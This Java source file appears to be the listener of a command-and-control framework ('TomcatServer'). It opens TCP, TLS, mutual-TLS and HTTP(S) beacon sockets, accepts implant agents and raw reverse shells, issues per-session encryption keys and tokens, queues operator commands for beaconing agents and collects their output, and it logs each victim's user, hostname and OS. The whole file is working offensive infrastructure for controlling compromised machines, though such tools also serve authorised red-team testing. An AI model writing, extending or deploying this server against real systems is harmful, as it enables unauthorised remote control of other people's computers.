package com.tomcat.core.server;

import com.tomcat.core.crypto.CertificateManager;
import com.tomcat.core.crypto.SymmetricCrypto;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

public final class TomcatServer extends BaseServer {

    private ServerSocket TcpSocket;
    private SSLServerSocket TlsSocket;
    private ServerSocket BeaconSocket;
    private Thread AcceptTcpThread;
    private Thread AcceptBeaconThread;
    private final ExecutorService Pool;

    private final ConcurrentHashMap<Integer, String> PendingCommands = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<Integer, String> PendingOutputs = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Integer> TokenMap = new ConcurrentHashMap<>();

    public TomcatServer(String Host, int Port, ListenerMode Mode, ServerConfig Config) {
        super(Host, Port, Mode, Config);
        this.Pool = Executors.newCachedThreadPool(R -> {
            Thread T = new Thread(R, "AgentWorker");
            T.setDaemon(true);
            return T;
        });
    }

    @Override
    public boolean[] StartServer() {
        try {
            OpenSockets();
            Running = true;
            Logger.Info("Server started — " + Host + ":" + Port + " [" + Mode.name() + "]");
            Events.Trigger(
                EventType.ServerStarted,
                EventManager.BuildData("Host", Host, "Port", Port, "Mode", Mode.name())
            );
            return new boolean[] { true };
        } catch (Exception E) {
            Logger.Error("Server start failed [" + Mode + "]: " + E.getMessage());
            return new boolean[] { false };
        }
    }

    private void OpenSockets() throws Exception {
        int BeaconPort = Config.GetBeaconPort();
        switch (Mode) {
            case MULTI, RAW -> {
                TcpSocket = new ServerSocket(Port, 50, InetAddress.getByName(Host));
                TcpSocket.setReuseAddress(true);
                Logger.Verbose("Plain TCP socket bound on " + Port);
                if (BeaconPort > 0 && Mode == ListenerMode.MULTI) {
                    BeaconSocket = new ServerSocket(BeaconPort, 50, InetAddress.getByName(Host));
                    BeaconSocket.setReuseAddress(true);
                    Logger.Info("HTTP beacon socket bound on " + BeaconPort);
                }
            }
            case HTTP -> {
                if (BeaconPort <= 0) BeaconPort = Port;
                BeaconSocket = new ServerSocket(BeaconPort, 50, InetAddress.getByName(Host));
                BeaconSocket.setReuseAddress(true);
            }
            case TLS, MTLS -> {
                SSLContext Ctx = BuildSslContext(Mode == ListenerMode.MTLS);
                TlsSocket = (SSLServerSocket) Ctx.getServerSocketFactory()
                    .createServerSocket(Port, 50, InetAddress.getByName(Host));
                TlsSocket.setNeedClientAuth(Mode == ListenerMode.MTLS);
                TlsSocket.setEnabledProtocols(new String[] { Config.GetTlsProtocol(), "TLSv1.2" });
            }
            case HTTPS -> {
                if (BeaconPort <= 0) BeaconPort = Port;
                SSLContext Ctx = BuildSslContext(false);
                BeaconSocket = Ctx.getServerSocketFactory()
                    .createServerSocket(BeaconPort, 50, InetAddress.getByName(Host));
                ((SSLServerSocket) BeaconSocket).setNeedClientAuth(false);
                ((SSLServerSocket) BeaconSocket).setEnabledProtocols(
                        new String[] { Config.GetTlsProtocol(), "TLSv1.2" }
                    );
            }
            case FMTLS -> {
                SSLContext TcpCtx = BuildSslContext(true);
                TlsSocket = (SSLServerSocket) TcpCtx.getServerSocketFactory()
                    .createServerSocket(Port, 50, InetAddress.getByName(Host));
                TlsSocket.setNeedClientAuth(true);
                TlsSocket.setEnabledProtocols(new String[] { Config.GetTlsProtocol(), "TLSv1.2" });
                if (BeaconPort > 0) {
                    SSLContext BeaconCtx = BuildSslContext(true);
                    BeaconSocket = BeaconCtx.getServerSocketFactory()
                        .createServerSocket(BeaconPort, 50, InetAddress.getByName(Host));
                    ((SSLServerSocket) BeaconSocket).setNeedClientAuth(true);
                    ((SSLServerSocket) BeaconSocket).setEnabledProtocols(
                            new String[] { Config.GetTlsProtocol(), "TLSv1.2" }
                        );
                }
            }
        }
    }

    private SSLContext BuildSslContext(boolean NeedClientAuth) throws Exception {
        CertificateManager Cm = new CertificateManager(Config);
        Cm.Initialize(Host);
        return Cm.BuildSslContext(NeedClientAuth);
    }

    @Override
    public void StopServer() {
        Running = false;
        CloseQuietly(TcpSocket);
        CloseQuietly(TlsSocket);
        CloseQuietly(BeaconSocket);
        if (AcceptTcpThread != null) AcceptTcpThread.interrupt();
        if (AcceptBeaconThread != null) AcceptBeaconThread.interrupt();
        Sessions.Clear();
        Pool.shutdown();
        Events.Trigger(EventType.ServerStopped);
        Logger.Info("Server stopped [" + Mode + "]");
    }

    @Override
    public void AcceptConnections() {
        if (BeaconSocket != null) {
            boolean IsTls = (BeaconSocket instanceof SSLServerSocket);
            AcceptBeaconThread = new Thread(() -> BeaconAcceptLoop(BeaconSocket, IsTls), "BeaconAccept");
            AcceptBeaconThread.setDaemon(true);
            AcceptBeaconThread.start();
        }

        ServerSocket Active = (TlsSocket != null) ? TlsSocket : TcpSocket;
        if (Active == null) {
            Logger.Warn("No TCP socket open for mode " + Mode + " — beacon-only mode");
            while (Running) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException E) {
                    break;
                }
            }
            return;
        }

        AcceptTcpThread = Thread.currentThread();
        while (Running) {
            try {
                Socket Client = Active.accept();
                Logger.Verbose("Accepted TCP from " + Client.getRemoteSocketAddress());
                Pool.submit(() -> HandleTcp(Client));
            } catch (SocketTimeoutException Ignored) {} catch (IOException E) {
                if (Running) Logger.Error("TCP accept error: " + E.getMessage());
                break;
            }
        }
    }

    private void BeaconAcceptLoop(ServerSocket Sock, boolean IsTls) {
        while (Running) {
            try {
                Socket Client = Sock.accept();
                Pool.submit(() -> HandleBeacon(Client, IsTls));
            } catch (SocketTimeoutException Ignored) {} catch (IOException E) {
                if (Running) Logger.Error("Beacon accept error: " + E.getMessage());
                break;
            }
        }
    }

    private void HandleTcp(Socket Client) {
        int SessionId = -1;
        try {
            Client.setTcpNoDelay(true);
            String RemoteAddr = Client.getRemoteSocketAddress().toString();

            if (Mode == ListenerMode.RAW) {
                SessionId = RegisterRaw(
                    Client,
                    new DetectionResult(
                        ConnectionType.RAW,
                        new PushbackInputStream(Client.getInputStream(), 512),
                        new byte[0]
                    ),
                    RemoteAddr
                );
                return;
            }

            DetectionResult Det = Detect(Client);
            Logger.Info("Connection [" + Det.Type + "] from " + RemoteAddr);

            switch (Det.Type) {
                case TOMCAT -> {
                    if (!Mode.AcceptsTomcatAgent()) {
                        Logger.Warn("Mode " + Mode + " rejects TOMCAT agents — dropping");
                        CloseQuietly(Client);
                        return;
                    }
                    SessionId = RegisterTomcat(Client, Det, RemoteAddr);
                }
                case RAW -> {
                    if (!Mode.AcceptsRawShell()) {
                        Logger.Warn("Mode " + Mode + " rejects raw shells — dropping");
                        CloseQuietly(Client);
                        return;
                    }
                    SessionId = RegisterRaw(Client, Det, RemoteAddr);
                }
                case HTTP -> {
                    if (!Mode.AcceptsHttp()) {
                        Logger.Warn("Mode " + Mode + " rejects HTTP — dropping");
                        CloseQuietly(Client);
                        return;
                    }
                    HandleBeacon(Client, false);
                }
                default -> {
                    Logger.Warn("Unknown protocol from " + RemoteAddr + " — dropping");
                    CloseQuietly(Client);
                }
            }
        } catch (Exception E) {
            Logger.Error("TCP handler error: " + E.getMessage());
            CloseQuietly(Client);
            if (SessionId > 0) RemoveSession(SessionId);
        }
    }

    private int RegisterTomcat(Socket Client, DetectionResult Det, String RemoteAddr) throws Exception {
        String CertCn = ValidateMtlsCert(Client);
        if (CertCn == null && Mode.RequiresClientCert()) {
            Logger.Error("mTLS: no valid client cert from " + RemoteAddr);
            CloseQuietly(Client);
            return -1;
        }

        // Per-session key — root cause fix
        SymmetricCrypto Crypto = NewSessionCrypto();

        Map<String, Object> Info = TomcatHandshake(
            Det.Stream,
            Client.getOutputStream(),
            Config.GetConnectionTimeout(),
            Crypto
        );

        Session S = BuildSession(Client, RemoteAddr, Info, false);
        S.SetSessionType(Session.Type.TOMCAT);
        S.SetEncrypted(true);
        S.SetMtlsEnabled(Mode.RequiresClientCert());
        S.SetCertCn(CertCn != null ? CertCn : "N/A");
        S.SetShellMode(Str(Info, "shellmode", "Standard"));

        int Id = Sessions.Add(S);
        SessionCryptos.put(Id, Crypto);
        CommandLocks.put(Id, new Object());
        FireConnected(S, Id);
        MonitorSession(Id, Client, false);
        Logger.Debug("TOMCAT session-" + Id + " registered — " + RemoteAddr);
        return Id;
    }

    private int RegisterRaw(Socket Client, DetectionResult Det, String RemoteAddr) throws Exception {
        Map<String, Object> Info = RawHandshake(Det.Stream, Client.getOutputStream(), RemoteAddr);
        Session S = BuildSession(Client, RemoteAddr, Info, true);
        S.SetSessionType(Session.Type.REVERSE_SHELL);
        S.SetEncrypted(false);
        S.SetMtlsEnabled(false);
        S.SetShellMode("Raw");

        int Id = Sessions.Add(S);
        CommandLocks.put(Id, new Object());
        FireConnected(S, Id);
        MonitorSession(Id, Client, true);
        Logger.Debug("Raw session-" + Id + " registered — " + RemoteAddr);
        return Id;
    }

    private void HandleBeacon(Socket Client, boolean IsTls) {
        int SessionId = -1;
        try {
            Client.setSoTimeout(Config.GetConnectionTimeout());
            InputStream In = Client.getInputStream();
            OutputStream Out = Client.getOutputStream();

            String ReqLine = ReadLine(In);
            if (ReqLine == null || ReqLine.isBlank()) {
                CloseQuietly(Client);
                return;
            }

            Map<String, String> Headers = new LinkedHashMap<>();
            String Line;
            while (!(Line = ReadLine(In)).isEmpty()) {
                int C = Line.indexOf(':');
                if (C > 0) Headers.put(Line.substring(0, C).trim().toLowerCase(), Line.substring(C + 1).trim());
            }

            int ContentLen = ParseInt(Headers.getOrDefault("content-length", "0"), 0);
            byte[] Body = ContentLen > 0 ? In.readNBytes(ContentLen) : new byte[0];
            String[] Parts = ReqLine.split(" ");
            String Method = Parts.length > 0 ? Parts[0] : "GET";
            String Full = Parts.length > 1 ? Parts[1] : "/";
            String Path = Full.contains("?") ? Full.substring(0, Full.indexOf('?')) : Full;
            Map<String, String> Query = ParseQuery(Full.contains("?") ? Full.substring(Full.indexOf('?') + 1) : "");

            if (Path.equals("/register") && Method.equals("POST")) SessionId = BeaconRegister(Client, Out, Body, IsTls);
            else if (Path.equals("/beacon") && Method.equals("GET")) BeaconGet(Out, Query);
            else if (Path.equals("/beacon") && Method.equals("POST")) BeaconPost(Out, Query, Body);
            else HttpReply(Out, 404, "Not Found", new byte[0]);
        } catch (Exception E) {
            Logger.Error("Beacon handler: " + E.getMessage());
            if (SessionId > 0) RemoveSession(SessionId);
        } finally {
            CloseQuietly(Client);
        }
    }

    private int BeaconRegister(Socket Client, OutputStream Out, byte[] Body, boolean IsTls) throws Exception {
        String Json = new String(Body, "UTF-8").trim();
        if (!Json.startsWith("{")) {
            HttpReply(Out, 400, "Bad Request", "Expected JSON".getBytes());
            return -1;
        }
        String CertCn = ValidateMtlsCert(Client);
        if (CertCn == null && Mode.RequiresClientCert()) {
            HttpReply(Out, 403, "Forbidden", "Client cert required".getBytes());
            return -1;
        }
        @SuppressWarnings("unchecked")
        Map<String, Object> Info = Gson.fromJson(Json, Map.class);
        for (String F : new String[] { "os", "hostname", "user" }) {
            if (!Info.containsKey(F)) {
                HttpReply(Out, 400, "Bad Request", ("Missing: " + F).getBytes());
                return -1;
            }
        }

        SymmetricCrypto Crypto = NewSessionCrypto();
        String Token = GenerateToken();
        Session S = BuildSession(Client, Client.getRemoteSocketAddress().toString(), Info, false);
        S.SetSessionType(Session.Type.TOMCAT);
        S.SetEncrypted(true);
        S.SetMtlsEnabled(Mode.RequiresClientCert());
        S.SetCertCn(CertCn != null ? CertCn : "N/A");
        S.SetShellMode("HTTP" + (IsTls ? "S" : ""));

        int Id = Sessions.Add(S);
        SessionCryptos.put(Id, Crypto);
        CommandLocks.put(Id, new Object());
        TokenMap.put(Token, Id);
        FireConnected(S, Id);

        String Reply = Gson.toJson(Map.of("token", Token, "key", Crypto.GetKeyAsBase64Url(), "id", Id));
        HttpReply(Out, 200, "OK", Reply.getBytes("UTF-8"));
        return Id;
    }

    private void BeaconGet(OutputStream Out, Map<String, String> Query) throws Exception {
        Integer Id = ResolveToken(Query);
        if (Id == null) {
            HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes());
            return;
        }
        SymmetricCrypto Crypto = SessionCryptos.get(Id);
        if (Crypto == null) {
            HttpReply(Out, 500, "Error", "Crypto missing".getBytes());
            return;
        }
        String Cmd = PendingCommands.remove(Id);
        byte[] Enc = Crypto.Encrypt((Cmd != null ? Cmd : "IDLE").getBytes("UTF-8"));
        HttpReply(Out, 200, "OK", Base64.getEncoder().encode(Enc));
    }

    private void BeaconPost(OutputStream Out, Map<String, String> Query, byte[] Body) throws Exception {
        Integer Id = ResolveToken(Query);
        if (Id == null) {
            HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes());
            return;
        }
        if (Body.length > 0) {
            SymmetricCrypto Crypto = SessionCryptos.get(Id);
            if (Crypto != null) {
                byte[] Dec = Base64.getDecoder().decode(Body);
                PendingOutputs.put(Id, Crypto.DecryptString(Dec));
            }
        }
        HttpReply(Out, 200, "OK", "OK".getBytes());
    }

    @Override
    public String[] ExecuteCommand(int SessionId, String Command) {
        Optional<Session> Opt = Sessions.Get(SessionId);
        if (Opt.isEmpty()) return Fail("Session not found");
        if (Opt.get().GetShellMode().startsWith("HTTP")) {
            Object Lck = CommandLocks.get(SessionId);
            if (Lck == null) return Fail("Lock missing");
            synchronized (Lck) {
                PendingCommands.put(SessionId, Command);
                PendingOutputs.remove(SessionId);
                long Dead = System.currentTimeMillis() + Config.GetCommandTimeout();
                while (System.currentTimeMillis() < Dead) {
                    String Result = PendingOutputs.remove(SessionId);
                    if (Result != null) return new String[] { "true", Result };
                    try {
                        Thread.sleep(300);
                    } catch (InterruptedException E) {
                        break;
                    }
                }
                PendingCommands.remove(SessionId);
                return Fail("Agent timeout");
            }
        }
        return super.ExecuteCommand(SessionId, Command);
    }

    private Integer ResolveToken(Map<String, String> Query) {
        String Token = Query.getOrDefault("token", "");
        Integer Id = TokenMap.get(Token);
        if (Id == null || !Sessions.Exists(Id)) return null;
        return Id;
    }

    private Session BuildSession(Socket Client, String RemoteAddr, Map<String, Object> Info, boolean IsRaw) {
        Session S = new Session();
        S.SetSocket(Client);
        S.SetRemoteAddress(RemoteAddr);
        S.SetOs(Str(Info, "os"));
        S.SetHostname(Str(Info, "hostname"));
        S.SetUser(Str(Info, "user"));
        S.SetArch(Str(Info, "architecture"));
        S.SetAgentIp(
            Str(Info, "agentip", RemoteAddr.contains("/") ? RemoteAddr.split("/")[1].split(":")[0] : RemoteAddr)
        );
        S.SetRawMode(IsRaw);
        String Name = Str(Info, "hostname");
        S.SetAgentName(Name.equals("Unknown") ? "Agent-" + (Sessions.Count() + 1) : Name);
        return S;
    }

    private void FireConnected(Session S, int Id) {
        Events.Trigger(
            EventType.AgentConnected,
            EventManager.BuildData(
                "ID",
                Id,
                "Hostname",
                S.GetHostname(),
                "OS",
                S.GetOs(),
                "User",
                S.GetUser(),
                "Arch",
                S.GetArch(),
                "AgentIP",
                S.GetAgentIp(),
                "AgentName",
                S.GetAgentName(),
                "Address",
                S.GetRemoteAddress(),
                "Type",
                S.GetSessionType().name(),
                "ShellMode",
                S.GetShellMode(),
                "Encrypted",
                S.IsEncrypted(),
                "MtlsEnabled",
                S.IsMtlsEnabled(),
                "CertCN",
                S.GetCertCn()
            )
        );
        Logger.Info(
            String.format(
                "[+] Session-%d | %-12s | %s@%s | %s | enc=%s mtls=%s",
                Id,
                S.GetSessionType().name(),
                S.GetUser(),
                S.GetHostname(),
                S.GetOs(),
                S.IsEncrypted(),
                S.IsMtlsEnabled()
            )
        );
    }

    private String ValidateMtlsCert(Socket Sock) {
        if (!(Sock instanceof SSLSocket)) return null;
        try {
            java.security.cert.Certificate[] Chain = ((SSLSocket) Sock).getSession().getPeerCertificates();
            if (Chain == null || Chain.length == 0) return null;
            java.security.cert.X509Certificate Cert = (java.security.cert.X509Certificate) Chain[0];
            String Dn = Cert.getSubjectX500Principal().getName();
            for (String Part : Dn.split(",")) {
                Part = Part.trim();
                if (Part.startsWith("CN=")) return Part.substring(3);
            }
        } catch (javax.net.ssl.SSLPeerUnverifiedException E) {
            Logger.Verbose("No peer cert: " + E.getMessage());
        } catch (Exception E) {
            Logger.Verbose("Cert CN extraction failed: " + E.getMessage());
        }
        return null;
    }

    private String GenerateToken() {
        byte[] B = new byte[32];
        new java.security.SecureRandom().nextBytes(B);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(B);
    }

    private static String ReadLine(InputStream In) throws IOException {
        StringBuilder Sb = new StringBuilder();
        int B;
        while ((B = In.read()) != -1) {
            if (B == '\r') continue;
            if (B == '\n') break;
            Sb.append((char) B);
        }
        return Sb.toString();
    }

    private static Map<String, String> ParseQuery(String Q) {
        Map<String, String> M = new LinkedHashMap<>();
        if (Q == null || Q.isBlank()) return M;
        for (String Pair : Q.split("&")) {
            int Eq = Pair.indexOf('=');
            if (Eq > 0) M.put(Pair.substring(0, Eq), Pair.substring(Eq + 1));
        }
        return M;
    }

    private static void HttpReply(OutputStream Out, int Status, String Reason, byte[] Body) throws IOException {
        String H =
            "HTTP/1.1 " +
            Status +
            " " +
            Reason +
            "\r\n" +
            "Content-Length: " +
            Body.length +
            "\r\n" +
            "Content-Type: application/octet-stream\r\n" +
            "Connection: close\r\n\r\n";
        Out.write(H.getBytes("UTF-8"));
        if (Body.length > 0) Out.write(Body);
        Out.flush();
    }

    private static void CloseQuietly(Closeable C) {
        if (C == null) return;
        try {
            C.close();
        } catch (Exception Ignored) {}
    }

    private static String Str(Map<String, Object> M, String K) {
        return Str(M, K, "Unknown");
    }

    private static String Str(Map<String, Object> M, String K, String Def) {
        Object V = M.get(K);
        return V != null ? V.toString() : Def;
    }

    private static int ParseInt(String S, int Def) {
        try {
            return Integer.parseInt(S.trim());
        } catch (Exception E) {
            return Def;
        }
    }
}
